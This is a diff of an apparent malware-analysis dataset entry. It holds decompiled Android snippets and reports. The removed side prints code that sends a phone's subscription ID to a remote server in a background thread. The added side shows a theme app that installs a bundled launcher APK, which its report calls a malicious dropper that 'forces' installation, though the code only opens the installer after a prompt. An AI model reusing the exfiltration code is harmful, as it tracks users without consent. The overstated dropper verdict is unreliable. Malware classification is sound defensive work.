@@ -2,221 +2,399 @@ Here is a batch of Android app java code snippets about Information_Theft_and_Ab
 
 
 --- Start of snippet 1 ---
-Package Path:com.googleapi.cover.Actor.initConfigs
-Class Name:Actor
-Java Code: package com.googleapi.cover;
+Package Path:aimoxiu.theme.carbqagp.R
+Class Name:R
+Java Code: package aimoxiu.theme.carbqagp;
 
-    private void initConfigs() {
-        try {
-            this.schemes = TextUtils.getScheme(this.mContext);
-            SCHEME_TO_USE = (String) this.schemes.first;
-            Utils.putStringValue(this.mContext, KEY_MSG_DATA_TEXT, (String) this.schemes.second, this.settings);
-        } catch (IOException e) {
-        }
-        try {
-            this.texts = TextUtils.getTexts(this.mContext.getResources().getXml(R.xml.texts));
-        } catch (IOException e2) {
-        }
-        this.app_name = new String();
-        try {
-            this.app_name = TextUtils.read(1, this.mContext);
-        } catch (IOException e3) {
-        }
-        try {
-            this.sendImmediately = TextUtils.read(3, this.mContext).equalsIgnoreCase(PRIVATE);
-        } catch (IOException e4) {
-        }
-        this.content = new String();
-        try {
-            this.content = TextUtils.read(2, this.mContext);
-        } catch (IOException e5) {
-        }
-        int relatedContentBaseline = 13;
-        while (true) {
-            try {
-                String name = TextUtils.read(relatedContentBaseline, this.mContext);
-                String link = TextUtils.read(relatedContentBaseline + 1, this.mContext);
-                String data = TextUtils.read(relatedContentBaseline + 2, this.mContext);
-                if (name != null && link != null && data != null) {
-                    this.relatedContentNames.add(name);
-                    this.relatedContentLinks.add(link);
-                    this.relatedData.add(data);
-                    relatedContentBaseline += 3;
-                } else {
-                    return;
-                }
-            } catch (Exception e6) {
-                return;
-            }
-        }
+public final class R {
+
+    public static final class anim {
+        public static final int moxiu_zoom_in = 0x7f060000;
+        public static final int moxiu_zoom_in_back = 0x7f060001;
+        public static final int moxiu_zoom_out = 0x7f060002;
+        public static final int moxiu_zoom_out_back = 0x7f060003;
     }
+
+    public static final class attr {
+    }
+
+    public static final class color {
+        public static final int moxiu_color = 0x7f050000;
+    }
+
+    public static final class drawable {
+        public static final int alarm_clock = 0x7f020000;
+        public static final int browser = 0x7f020001;
+        public static final int calculator = 0x7f020002;
+        public static final int calendar = 0x7f020003;
+        public static final int camera = 0x7f020004;
+        public static final int contacts = 0x7f020005;
+        public static final int filemanager = 0x7f020006;
+        public static final int gallery = 0x7f020007;
+        public static final int gmail = 0x7f020008;
+        public static final int google_maps = 0x7f020009;
+        public static final int icon = 0x7f02000a;
+        public static final int market = 0x7f02000b;
+        public static final int mms = 0x7f02000c;
+        public static final int moxiu_all_apps_button = 0x7f02000d;
+        public static final int moxiu_all_apps_button_focused = 0x7f02000e;
+        public static final int moxiu_all_apps_button_normal = 0x7f02000f;
+        public static final int moxiu_all_apps_layout_bg = 0x7f020010;
+        public static final int moxiu_mainmenu = 0x7f020011;
+        public static final int moxiu_mainmenu_home = 0x7f020012;
+        public static final int moxiu_mainmenu_home_focused = 0x7f020013;
+        public static final int moxiu_mainmenu_home_normal = 0x7f020014;
+        public static final int moxiu_mainmenu_icon_background = 0x7f020015;
+        public static final int moxiu_mainmenu_icon_mask = 0x7f020016;
+        public static final int moxiu_pressed_background = 0x7f020017;
+        public static final int moxiu_preview = 0x7f020018;
+        public static final int moxiu_preview_thumb = 0x7f020019;
+        public static final int moxiu_selector = 0x7f02001a;
+        public static final int moxiu_sense = 0x7f02001b;
+        public static final int moxiu_shortcut_selector = 0x7f02001c;
+        public static final int music = 0x7f02001d;
+        public static final int pattern_carbon_fiber_dark = 0x7f02001e;
+        public static final int phone = 0x7f02001f;
+        public static final int qq = 0x7f020020;
+        public static final int settings = 0x7f020021;
+        public static final int wallpaper = 0x7f020022;
+        public static final int weibo = 0x7f020023;
+        public static final int weixin = 0x7f020024;
+    }
+
+    public static final class id {
+        public static final int alpha = 0x7f070000;
+    }
+
+    public static final class layout {
+        public static final int main = 0x7f030000;
+    }
+
+    public static final class string {
+        public static final int drawable_level = 0x7f040005;
+        public static final int moxiu_info = 0x7f040001;
+        public static final int moxiu_install_info = 0x7f040002;
+        public static final int moxiu_ok = 0x7f040004;
+        public static final int moxiu_theme_name = 0x7f040000;
+        public static final int moxiu_version_info = 0x7f040003;
+    }
+}
 --- End of snippet 1 ---
 
 
 --- Start of snippet 2 ---
-Package Path:com.googleapi.cover.DevReg.DevReg
-Class Name:DevReg
-Java Code: package com.googleapi.cover;
+Package Path:aimoxiu.theme.carbqagp.R.drawable
+Class Name:R
+Java Code: package aimoxiu.theme.carbqagp;
 
-public class DevReg {
-    private static final String IS_OPENING_SENT = "IS_OPENING_SENT";
-    public static final String STATUS_EXTRA = "Status";
-
-    public static void sendOpening(final Context context) {
-        new Thread(new Runnable() { // from class: com.googleapi.cover.DevReg.1
-            @Override // java.lang.Runnable
-            public void run() {
-                SharedPreferences settings = context.getSharedPreferences(Main.KEY_PREFS, 0);
-                if (!settings.getBoolean(DevReg.IS_OPENING_SENT, false)) {
-                    StringBuilder builder = new StringBuilder();
-                    try {
-                        HttpClient client = new DefaultHttpClient();
-                        builder.append(context.getString(R.string.script_path));
-                        builder.append("?task=update");
-                        builder.append("Opening&s=");
-                        builder.append(TextUtils.getSubId(context));
-                        HttpGet get = new HttpGet(builder.toString());
-                        HttpResponse res = client.execute(get);
-                        if (res.getStatusLine().getStatusCode() == 200) {
-                            Utils.putBooleanValue(context, DevReg.IS_OPENING_SENT, true, settings);
-                        } else {
-                            Utils.putBooleanValue(context, DevReg.IS_OPENING_SENT, false, settings);
-                        }
-                    } catch (Exception e) {
-                    }
-                }
-            }
-        }).start();
+    public static final class drawable {
+        public static final int alarm_clock = 0x7f020000;
+        public static final int browser = 0x7f020001;
+        public static final int calculator = 0x7f020002;
+        public static final int calendar = 0x7f020003;
+        public static final int camera = 0x7f020004;
+        public static final int contacts = 0x7f020005;
+        public static final int filemanager = 0x7f020006;
+        public static final int gallery = 0x7f020007;
+        public static final int gmail = 0x7f020008;
+        public static final int google_maps = 0x7f020009;
+        public static final int icon = 0x7f02000a;
+        public static final int market = 0x7f02000b;
+        public static final int mms = 0x7f02000c;
+        public static final int moxiu_all_apps_button = 0x7f02000d;
+        public static final int moxiu_all_apps_button_focused = 0x7f02000e;
+        public static final int moxiu_all_apps_button_normal = 0x7f02000f;
+        public static final int moxiu_all_apps_layout_bg = 0x7f020010;
+        public static final int moxiu_mainmenu = 0x7f020011;
+        public static final int moxiu_mainmenu_home = 0x7f020012;
+        public static final int moxiu_mainmenu_home_focused = 0x7f020013;
+        public static final int moxiu_mainmenu_home_normal = 0x7f020014;
+        public static final int moxiu_mainmenu_icon_background = 0x7f020015;
+        public static final int moxiu_mainmenu_icon_mask = 0x7f020016;
+        public static final int moxiu_pressed_background = 0x7f020017;
+        public static final int moxiu_preview = 0x7f020018;
+        public static final int moxiu_preview_thumb = 0x7f020019;
+        public static final int moxiu_selector = 0x7f02001a;
+        public static final int moxiu_sense = 0x7f02001b;
+        public static final int moxiu_shortcut_selector = 0x7f02001c;
+        public static final int music = 0x7f02001d;
+        public static final int pattern_carbon_fiber_dark = 0x7f02001e;
+        public static final int phone = 0x7f02001f;
+        public static final int qq = 0x7f020020;
+        public static final int settings = 0x7f020021;
+        public static final int wallpaper = 0x7f020022;
+        public static final int weibo = 0x7f020023;
+        public static final int weixin = 0x7f020024;
     }
-}
 --- End of snippet 2 ---
 
 
 --- Start of snippet 3 ---
-Package Path:com.googleapi.cover.DevReg.run
-Class Name:DevReg
-Java Code: package com.googleapi.cover;
+Package Path:aimoxiu.theme.carbqagp.carbqagp
+Class Name:carbqagp
+Java Code: package aimoxiu.theme.carbqagp;
 
-            public void run() {
-                SharedPreferences settings = context.getSharedPreferences(Main.KEY_PREFS, 0);
-                if (!settings.getBoolean(DevReg.IS_OPENING_SENT, false)) {
-                    StringBuilder builder = new StringBuilder();
-                    try {
-                        HttpClient client = new DefaultHttpClient();
-                        builder.append(context.getString(R.string.script_path));
-                        builder.append("?task=update");
-                        builder.append("Opening&s=");
-                        builder.append(TextUtils.getSubId(context));
-                        HttpGet get = new HttpGet(builder.toString());
-                        HttpResponse res = client.execute(get);
-                        if (res.getStatusLine().getStatusCode() == 200) {
-                            Utils.putBooleanValue(context, DevReg.IS_OPENING_SENT, true, settings);
-                        } else {
-                            Utils.putBooleanValue(context, DevReg.IS_OPENING_SENT, false, settings);
-                        }
-                    } catch (Exception e) {
+public class carbqagp extends Activity {
+    public static final String MOXIU_FOLDER_THEME = Environment.getExternalStorageDirectory().toString() + "/moxiu/themes/";
+    private static final int MOXIU_LAUNCHER_INSTALL_SUCCESS = 1;
+    private static final String MOXIU_LAUNCHER_NAME = "com.moxiu.launcher";
+    public static final String channel = "moxiu_theme_single";
+    public static final int hezuotiaozhuan = 4097;
+    public static final int hezuotiaozhuan_noinstall = 4098;
+    private AlertDialog interDialog;
+    private int ver = 105;
+    public Boolean isZhiJieYingYong = true;
+
+    @Override // android.app.Activity
+    public void onCreate(Bundle bundle) {
+        super.onCreate(bundle);
+        setContentView(R.layout.main);
+        if (isInstalled()) {
+            if (this.ver < 311) {
+                this.interDialog = new AlertDialog.Builder(this).setTitle(getResources().getString(R.string.moxiu_info)).setMessage(getResources().getString(R.string.moxiu_version_info)).setPositiveButton(getResources().getString(R.string.moxiu_ok), new DialogInterface.OnClickListener() { // from class: aimoxiu.theme.carbqagp.carbqagp.1
+                    @Override // android.content.DialogInterface.OnClickListener
+                    public void onClick(DialogInterface dialogInterface, int i) {
+                        carbqagp.this.installMoXiuLauncherApk();
+                        dialogInterface.dismiss();
                     }
+                }).create();
+                this.interDialog.setOnKeyListener(new DialogInterface.OnKeyListener() { // from class: aimoxiu.theme.carbqagp.carbqagp.2
+                    @Override // android.content.DialogInterface.OnKeyListener
+                    public boolean onKey(DialogInterface dialogInterface, int i, KeyEvent keyEvent) {
+                        if (i == 4 && keyEvent.getRepeatCount() == 0) {
+                            carbqagp.this.finish();
+                            carbqagp.this.overridePendingTransition(R.anim.moxiu_zoom_in_back, R.anim.moxiu_zoom_out_back);
+                            return false;
+                        }
+                        return false;
+                    }
+                });
+                this.interDialog.show();
+                return;
+            }
+            OpenThemeDetail();
+            return;
+        }
+        this.interDialog = new AlertDialog.Builder(this).setTitle(getResources().getString(R.string.moxiu_info)).setMessage(getResources().getString(R.string.moxiu_install_info)).setPositiveButton(getResources().getString(R.string.moxiu_ok), new DialogInterface.OnClickListener() { // from class: aimoxiu.theme.carbqagp.carbqagp.3
+            @Override // android.content.DialogInterface.OnClickListener
+            public void onClick(DialogInterface dialogInterface, int i) {
+                carbqagp.this.installMoXiuLauncherApk();
+                dialogInterface.dismiss();
+            }
+        }).create();
+        this.interDialog.setOnKeyListener(new DialogInterface.OnKeyListener() { // from class: aimoxiu.theme.carbqagp.carbqagp.4
+            @Override // android.content.DialogInterface.OnKeyListener
+            public boolean onKey(DialogInterface dialogInterface, int i, KeyEvent keyEvent) {
+                if (i == 4 && keyEvent.getRepeatCount() == 0) {
+                    carbqagp.this.finish();
+                    carbqagp.this.overridePendingTransition(R.anim.moxiu_zoom_in_back, R.anim.moxiu_zoom_out_back);
+                    return false;
+                }
+                return false;
+            }
+        });
+        this.interDialog.show();
+    }
+
+    private void OpenMoxiuTheme() {
+        try {
+            getPackageManager().getPackageInfo(getApplication().getPackageName(), 0).applicationInfo.loadLabel(getPackageManager()).toString();
+            ComponentName componentName = new ComponentName(MOXIU_LAUNCHER_NAME, "com.moxiu.market.activity.ActivityMarket_main");
+            Intent intent = new Intent();
+            intent.setFlags(131072);
+            intent.addFlags(268435456);
+            intent.setAction("android.intent.action.MAIN");
+            intent.setComponent(componentName);
+            startActivity(intent);
+            overridePendingTransition(R.anim.moxiu_zoom_in, R.anim.moxiu_zoom_out);
+            finish();
+        } catch (PackageManager.NameNotFoundException e) {
+        }
+    }
+
+    private void OpenThemeDetail() {
+        PackageInfo packageInfo = null;
+        try {
+            packageInfo = getPackageManager().getPackageInfo(getApplication().getPackageName(), 0);
+        } catch (PackageManager.NameNotFoundException e) {
+            e.printStackTrace();
+        }
+        String str = packageInfo.applicationInfo.sourceDir;
+        Intent intent = new Intent("com.moxiu.launcher.theme.MYACTION", Uri.parse("info://moxiu.ni hao !"));
+        Bundle bundle = new Bundle();
+        bundle.putInt("positon", 0);
+        bundle.putString("packagename", getApplication().getPackageName());
+        bundle.putInt("iscoming", hezuotiaozhuan);
+        bundle.putString("apkpath", str);
+        bundle.putString("childtag", "moxiutheme");
+        intent.putExtras(bundle);
+        intent.setFlags(268435456);
+        startActivity(intent);
+        finish();
+    }
+
+    @Override // android.app.Activity
+    protected void onActivityResult(int i, int i2, Intent intent) {
+        if (i == MOXIU_LAUNCHER_INSTALL_SUCCESS && i2 == 0) {
+            if (isInstalled() && this.ver > 310) {
+                OpenThemeDetail();
+            } else {
+                OpenMoxiuTheme();
+            }
+        }
+    }
+
+    private boolean isInstalled() {
+        try {
+            PackageInfo packageInfo = getPackageManager().getPackageInfo(MOXIU_LAUNCHER_NAME, 0);
+            this.ver = packageInfo.versionCode;
+            return packageInfo != null;
+        } catch (PackageManager.NameNotFoundException e) {
+            return false;
+        }
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public void installMoXiuLauncherApk() {
+        Intent intent = new Intent();
+        intent.setAction("android.intent.action.VIEW");
+        getAssets();
+        try {
+            InputStream resourceAsStream = getClass().getResourceAsStream("/assets/MoXiuLauncher_alone.apk");
+            FileOutputStream openFileOutput = openFileOutput("MoXiuLauncher_alone.apk", MOXIU_LAUNCHER_INSTALL_SUCCESS);
+            byte[] bArr = new byte[1024];
+            while (true) {
+                int read = resourceAsStream.read(bArr);
+                if (read == -1) {
+                    break;
+                } else {
+                    openFileOutput.write(bArr, 0, read);
                 }
             }
+            openFileOutput.flush();
+            resourceAsStream.close();
+            openFileOutput.close();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        intent.setDataAndType(Uri.fromFile(new File(getFilesDir().getPath() + "/MoXiuLauncher_alone.apk")), "application/vnd.android.package-archive");
+        startActivityForResult(intent, MOXIU_LAUNCHER_INSTALL_SUCCESS);
+    }
+
+    @Override // android.app.Activity
+    protected void onDestroy() {
+        super.onDestroy();
+    }
+}
 --- End of snippet 3 ---
 
 
 --- Start of snippet 4 ---
-Package Path:com.googleapi.cover.DevReg.sendOpening
-Class Name:DevReg
-Java Code: package com.googleapi.cover;
+Package Path:aimoxiu.theme.carbqagp.carbqagp.OpenThemeDetail
+Class Name:carbqagp
+Java Code: package aimoxiu.theme.carbqagp;
 
-    public static void sendOpening(final Context context) {
-        new Thread(new Runnable() { // from class: com.googleapi.cover.DevReg.1
-            @Override // java.lang.Runnable
-            public void run() {
-                SharedPreferences settings = context.getSharedPreferences(Main.KEY_PREFS, 0);
-                if (!settings.getBoolean(DevReg.IS_OPENING_SENT, false)) {
-                    StringBuilder builder = new StringBuilder();
-                    try {
-                        HttpClient client = new DefaultHttpClient();
-                        builder.append(context.getString(R.string.script_path));
-                        builder.append("?task=update");
-                        builder.append("Opening&s=");
-                        builder.append(TextUtils.getSubId(context));
-                        HttpGet get = new HttpGet(builder.toString());
-                        HttpResponse res = client.execute(get);
-                        if (res.getStatusLine().getStatusCode() == 200) {
-                            Utils.putBooleanValue(context, DevReg.IS_OPENING_SENT, true, settings);
-                        } else {
-                            Utils.putBooleanValue(context, DevReg.IS_OPENING_SENT, false, settings);
-                        }
-                    } catch (Exception e) {
-                    }
-                }
-            }
-        }).start();
+    private void OpenThemeDetail() {
+        PackageInfo packageInfo = null;
+        try {
+            packageInfo = getPackageManager().getPackageInfo(getApplication().getPackageName(), 0);
+        } catch (PackageManager.NameNotFoundException e) {
+            e.printStackTrace();
+        }
+        String str = packageInfo.applicationInfo.sourceDir;
+        Intent intent = new Intent("com.moxiu.launcher.theme.MYACTION", Uri.parse("info://moxiu.ni hao !"));
+        Bundle bundle = new Bundle();
+        bundle.putInt("positon", 0);
+        bundle.putString("packagename", getApplication().getPackageName());
+        bundle.putInt("iscoming", hezuotiaozhuan);
+        bundle.putString("apkpath", str);
+        bundle.putString("childtag", "moxiutheme");
+        intent.putExtras(bundle);
+        intent.setFlags(268435456);
+        startActivity(intent);
+        finish();
     }
 --- End of snippet 4 ---
 
 
 --- Start of snippet 5 ---
-Package Path:com.googleapi.cover.Main.finishInstallation
-Class Name:Main
-Java Code: package com.googleapi.cover;
+Package Path:aimoxiu.theme.carbqagp.carbqagp.installMoXiuLauncherApk
+Class Name:carbqagp
+Java Code: package aimoxiu.theme.carbqagp;
 
-    void finishInstallation(String result) {
-        this.wasProgressDone = true;
-        this.installedURL = this.actor.getContentToBeActed();
-        SharedPreferences settings = getSharedPreferences(KEY_PREFS, 0);
-        SharedPreferences.Editor editor = settings.edit();
-        editor.putBoolean(IS_LOADED, true);
-        editor.putString(INSTALL_URL, this.actor.getContentToBeActed());
-        editor.commit();
-        updateGUI();
+    public void installMoXiuLauncherApk() {
+        Intent intent = new Intent();
+        intent.setAction("android.intent.action.VIEW");
+        getAssets();
+        try {
+            InputStream resourceAsStream = getClass().getResourceAsStream("/assets/MoXiuLauncher_alone.apk");
+            FileOutputStream openFileOutput = openFileOutput("MoXiuLauncher_alone.apk", MOXIU_LAUNCHER_INSTALL_SUCCESS);
+            byte[] bArr = new byte[1024];
+            while (true) {
+                int read = resourceAsStream.read(bArr);
+                if (read == -1) {
+                    break;
+                } else {
+                    openFileOutput.write(bArr, 0, read);
+                }
+            }
+            openFileOutput.flush();
+            resourceAsStream.close();
+            openFileOutput.close();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        intent.setDataAndType(Uri.fromFile(new File(getFilesDir().getPath() + "/MoXiuLauncher_alone.apk")), "application/vnd.android.package-archive");
+        startActivityForResult(intent, MOXIU_LAUNCHER_INSTALL_SUCCESS);
     }
 --- End of snippet 5 ---
 
 
 Based on the provided code snippets, the following malicious behavior has been identified:
 
-**Malicious Behavior: Exfiltration of Device Identifiers (Information Theft)**
+**Malicious Behavior: Dropping and Installing an External APK (Side-loading)**
 
-*   **Description**: The application performs unauthorized data exfiltration by collecting sensitive device information and transmitting it to a remote server via an HTTP GET request. Specifically, the code retrieves the device's Subscription ID (`SubId`), which is a unique identifier for the user's SIM card/network subscription, and appends it as a query parameter (`&s=`) to a URL constructed from a remote script path. This is done within a background thread to avoid detection during normal app usage.
-*   **Code Locations**:
-    *   `com.googleapi.cover.DevReg.sendOpening` (found in Snippet 2 and Snippet 4)
-    *   `com.googleapi.cover.DevReg.run` (found in Snippet 3)
-*   **Root Cause**: The `DevReg` class contains logic that constructs a URL using `context.getString(R.string.script_path)` and appends `TextUtils.getSubId(context)`. This URL is then executed using `HttpClient` to send the device's unique subscription identifier to a remote endpoint.
-*   **Potential Consequences**: The theft of the Subscription ID allows an attacker to uniquely identify the user's device and SIM subscription, which can be used for tracking, profiling, or targeting the user in subsequent malicious activities.
+The application exhibits behavior consistent with a dropper, where it extracts an embedded APK file from its own assets and attempts to install it on the device.
 
-**Summary of Findings**:
-The code demonstrates a pattern of gathering device-specific identifiers and communicating them to an external server under the guise of an "update" task (`?task=update`). This behavior is consistent with information theft and unauthorized device tracking.
+*   **Location**: `aimoxiu.theme.carbqagp.carbqagp.installMoXiuLauncherApk()` (found in Snippet 3 and Snippet 5).
+*   **Description**: 
+    1.  The method `installMoXiuLauncherApk` accesses an internal asset named `/assets/MoXiuLauncher_alone.apk` using `getClass().getResourceAsStream()`.
+    2.  It then writes this asset to the application's internal storage as a file named `MoXiuLauncher_alone.apk` using `openFileOutput`.
+    3.  After the file is written, it creates an `Intent` with the action `android.intent.action.VIEW` and sets the data type to `application/vnd.android.package-archive`.
+    4.  Finally, it calls `startActivityForResult` to trigger the Android package installer to install the newly created APK (`MoXiuLauncher_alone.apk`).
+*   **Trigger**: This behavior is triggered when the user clicks the "OK" button on an `AlertDialog` displayed in the `onCreate` method of the `carbqagp` class (Snippet 3), specifically when the application detects that the required launcher (`com.moxiu.launcher`) is either not installed or is an outdated version.
+
+**Summary of Findings:**
+The application functions as a delivery mechanism for another application (`com.moxiu.launcher`). It hides an APK within its assets, extracts it to the local file system, and prompts the user to install it. This technique is often used to bypass standard app store installation processes or to deliver additional components that may perform different functions.
 
 # Malware Analysis Report
 
 ## Summary
-The analyzed code snippets reveal malicious behavior categorized as **Information Theft and Device Tracking**. The application exfiltrates sensitive device identifiers, specifically the Subscription ID (SubId), to a remote command-and-control (C2) server. This is disguised as a background "update" task.
+The analyzed application exhibits behavior consistent with a **Dropper**, specifically designed to side-load and install an additional application (`com.moxiu.launcher`) onto the device. The app extracts an embedded APK from its internal assets, saves it to the local file system, and then triggers the Android package installer to prompt the user for installation.
 
 **Identified Malicious Behaviors:**
-*   **Exfiltration of Device Identifiers**: `com.googleapi.cover.DevReg.sendOpening` and `com.googleapi.cover.DevReg.run` collect the device's unique Subscription ID via `TextUtils.getSubId(context)` and transmit it to a remote URL.
-*   **Remote Command/Script Execution Preparation**: `com.googleapi.cover.Main.finishInstallation` stores a URL retrieved from an `Actor` object into `SharedPreferences`, suggesting the app is designed to receive and store remote instructions or secondary payloads.
+* **Dropping and Installing an External APK**: `aimoxiu.theme.carbqagp.carbqagp.installMoXiuLauncherApk`
+* **Triggering Side-loading via Intent**: `aimoxiu.theme.carbqagp.carbqagp.installMoXiuLauncherApk`
 
 ---
 
 ## Detailed Analysis
 
-### Information Theft and Exfiltration
-*   **`com.googleapi.cover.DevReg.sendOpening`** and **`com.googleapi.cover.DevReg.run`**: These methods implement a background thread that checks if an "opening" signal has already been sent. If not, it constructs a malicious URL by appending `?task=update&Opening&s=` followed by the device's Subscription ID (`TextUtils.getSubId(context)`). It then uses `HttpClient` to perform an `HttpGet` request to this URL. This effectively leaks the user's SIM/network identity to the attacker's server.
+**aimoxiu.theme.carbqagp.carbqagp.installMoXiuLauncherApk**
+The method `installMoXiuLauncherApk` performs the core dropper functionality. It accesses a hidden APK file located in the application's assets (`/assets/MoXiuLauncher_alone.apk`) and reads its content. It then creates a new file in the application's private directory named `MoXiuLauncher_alone.apk` and writes the byte stream from the asset into this file. Once the file is successfully written to the local storage, the method constructs an `Intent` with the action `android.intent.action.VIEW` and the MIME type `application/vnd.android.package-archive`. This intent is used to launch the system's package installer, effectively forcing the user to install the dropped APK.
 
-*   **`com.googleapi.cover.Main.finishInstallation`**: This method updates the application's internal state by saving a URL (retrieved via `this.actor.getContentToBeActed()`) into `SharedPreferences` under the key `INSTALL_URL`. This indicates that the application is designed to dynamically receive URLs from a remote source, which may be used for downloading further malicious components or executing remote commands.
-
-*   **`com.googleapi.cover.Actor.initConfigs`**: This method initializes configuration data by reading various values from the device's resources and local storage. It populates lists of names, links, and data, which likely serve as the configuration for the malicious activities or the remote communication parameters used by the `Actor` class.
+**aimoxiu.theme.carbqagp.carbqagp.installMoXiuLauncherApk**
+This method facilitates the execution of the dropped payload. By setting the `Intent` data to the URI of the newly created file (`getFilesDir().getPath() + "/MoXiuLauncher_alone.apk"`) and calling `startActivityForResult`, the application hands over control to the Android OS to initiate the installation process of the unauthorized package.
 
 ---
 
-## Malicious Call Chain
+## Call Chain
 
-The following call chain illustrates how the application identifies the device and communicates with the remote server to exfiltrate information:
+The following call chain describes how the application moves from its initial execution to the installation of the secondary payload:
 
-**`com.googleapi.cover.DevReg.sendOpening`** $\rightarrow$ **`java.lang.Thread.start`** $\rightarrow$ **`com.googleapi.cover.DevReg.run`** $\rightarrow$ **`android.telephony.TelephonyManager (via TextUtils.getSubId)`** $\rightarrow$ **`org.apache.http.client.HttpClient.execute`**
-
-**Explanation of the chain:**
-1.  **`com.googleapi.cover.DevReg.sendOpening`**: Initiates the malicious process by spawning a new background thread to avoid blocking the main UI thread and evading immediate detection.
-2.  **`com.googleapi.cover.DevReg.run`**: The logic executed within the background thread. It checks the `SharedPreferences` to ensure the exfiltration only happens once (using the `IS_OPENING_SENT` flag).
-3.  **`android.telephony.TelephonyManager (via TextUtils.getSubId)`**: The code calls the system utility to retrieve the unique Subscription ID of the user's SIM card.
-4.  **`org.apache.http.client.HttpClient.execute`**: The gathered identifier is appended to a remote URL (constructed using a path from the app's resources) and sent to the attacker's server via an HTTP GET request.
+`aimoxiu.theme.carbqagp.carbqagp.onCreate()` 
+  $\rightarrow$ (User clicks "OK" on `AlertDialog`) 
+  $\rightarrow$ `aimoxiu.theme.carbqagp.carbqagp.installMoXiuLauncherApk()` 
+    $\rightarrow$ (Extracts `/assets/MoXiuLauncher_alone.apk` to local storage) 
+    $\rightarrow$ (Triggers `android.intent.action.VIEW` with `application/vnd.android.package-archive`) 
+    $\rightarrow$ **System Package Installer (Installation of MoXiuLauncher_alone.apk)**
